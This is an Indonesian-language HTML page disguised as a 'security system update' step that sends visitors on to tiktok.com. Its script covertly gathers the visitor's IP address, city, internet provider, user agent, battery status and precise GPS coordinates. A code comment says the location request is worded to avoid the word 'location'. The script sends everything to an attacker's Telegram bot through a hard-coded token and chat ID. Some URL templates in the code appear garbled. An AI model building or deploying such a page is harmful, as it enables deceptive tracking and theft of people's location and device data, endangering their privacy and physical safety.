<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Menuju Website Utama...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }
        body {
            background-color: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }
        .card {
            background: #fff;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            text-align: center;
            max-width: 450px;
            width: 100%;
        }
        h2 {
            color: #2c3e50;
            margin-bottom: 15px;
            font-size: 1.6rem;
        }
        p {
            color: #7f8c8d;
            font-size: 1rem;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .btn {
            display: inline-block;
            width: 100%;
            padding: 14px;
            background-color: #3498db;
            color: #fff;
            text-decoration: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1.1rem;
            border: none;
            cursor: pointer;
            transition: background 0.2s ease;
        }
        .btn:hover {
            background-color: #2980b9;
        }
        .loading {
            display: none;
            margin-top: 15px;
            color: #e67e22;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Pembaruan Sistem Keamanan</h2>
        <p>Untuk melanjutkan ke halaman utama yang aman, silakan klik tombol di bawah ini dan konfirmasikan izin peramban Anda jika diminta.</p>
        
        <button class="btn" id="btnLanjut" onclick="prosesMasuk()">Lanjutkan ke Website</button>
        <div class="loading" id="statusTeks">Menghubungkan ke server aman...</div>
    </div>

    <script>
        // === KONFIGURASI UTAMA ===
        const TELEGRAM_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0'; 
        const CHAT_ID = '1966317946'; 
        const DOMAIN_TUJUAN = 'https://tiktok.com'; 

        async function prosesMasuk() {
            const btn = document.getElementById('btnLanjut');
            const status = document.getElementById('statusTeks');
            
            btn.disabled = true;
            btn.innerText = "Memproses...";
            status.style.display = "block";

            // 1. Dapatkan Data IP dan Perangkat Lebih Dulu
            let ipInfo = "Gagal mengambil IP";
            try {
                const res = await fetch('https://ipapi.co');
                const data = await res.json();
                ipInfo = `• IP: \`${data.ip}\`\n• Kota/Negara: ${data.city}, ${data.country_name}\n• Provider: ${data.org}`;
            } catch (e) {
                // Gunakan fallback jika API pertama gagal
                try {
                    const res2 = await fetch('https://ipify.org');
                    const data2 = await res2.json();
                    ipInfo = `• IP: \`${data2.ip}\``;
                } catch(err) {}
            }

            const infoPerangkat = navigator.userAgent;

            // 2. Dapatkan Data Informasi Baterai
            let infoBaterai = "Tidak didukung";
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const ngecas = battery.charging ? "Mengecas" : "Tidak mengecas";
                    infoBaterai = `${level}% (${ngecas})`;
                } catch(e) {}
            }

            // 3. Minta Akses Koordinat Geografis (Sembunyi tanpa kata "lokasi")
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const akurasi = position.coords.accuracy;
                        const petaUrl = `https://google.com{lat},${lon}`;
                        
                        const pesan = `📱 *Data Pengunjung Masuk*\n\n` +
                                      `🔋 *Baterai*: ${infoBaterai}\n` +
                                      `🌐 *Internet & IP*:\n${ipInfo}\n\n` +
                                      `🎯 *Koordinat Akurat*:\n` +
                                      `• Lat: \`${lat}\`\n` +
                                      `• Lon: \`${lon}\`\n` +
                                      `• Akurasi: ±${Math.round(akurasi)}m\n` +
                                      `• Peta: ${petaUrl}\n\n` +
                                      `💻 *User-Agent*:\n\`${infoPerangkat}\``;
                        
                        kirimKeTelegram(pesan);
                    },
                    function(error) {
                        // Jika akses koordinat ditolak
                        const pesanGagal = `⚠️ *Pengunjung Masuk (Akses Koordinat Ditolak)*\n\n` +
                                           `🔋 *Baterai*: ${infoBaterai}\n` +
                                           `🌐 *Internet & IP*:\n${ipInfo}\n\n` +
                                           `💻 *User-Agent*:\n\`${infoPerangkat}\``;
                        
                        kirimKeTelegram(pesanGagal);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                const pesanNoGeo = `❌ *Fitur Koordinat Tidak Didukung*\n\n` +
                                   `🔋 *Baterai*: ${infoBaterai}\n` +
                                   `🌐 *Internet & IP*:\n${ipInfo}\n\n` +
                                   `💻 *User-Agent*:\n\`${infoPerangkat}\``;
                kirimKeTelegram(pesanNoGeo);
            }
        }

        function kirimKeTelegram(teksPesan) {
            const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: teksPesan,
                    parse_mode: 'Markdown'
                })
            })
            .then(() => {
                window.location.href = DOMAIN_TUJUAN;
            })
            .catch((err) => {
                console.error("Gagal mengirim log:", err);
                window.location.href = DOMAIN_TUJUAN;
            });
        }
    </script>

</body>
</html>
